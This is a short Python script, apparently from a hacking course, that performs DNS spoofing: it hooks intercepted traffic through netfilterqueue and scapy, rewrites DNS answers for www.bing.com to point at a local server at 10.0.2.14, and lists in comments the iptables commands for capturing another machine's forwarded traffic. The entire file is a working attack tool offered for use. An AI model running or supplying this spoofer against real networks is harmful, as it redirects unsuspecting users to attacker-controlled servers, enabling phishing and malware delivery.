#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

# <<OTHER MACHINE>> iptables -I FORWARD -j NFQUEUE --queue-num 0
# <<Same MACHINE>>  iptables -I OUTPUT -j NFQUEUE --queue-num 0
# <<Same MACHINE>>  iptables -I INPUT -j NFQUEUE --queue-num 0
# <<AFTER DONE>>    iptables --flush
# <<GET IP>>        ping -c 1 www.website.com
# <<WEB SERVER>>    service apache2 start

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.14")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    # print(scapy_packet.show())
    packet.accept()



queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()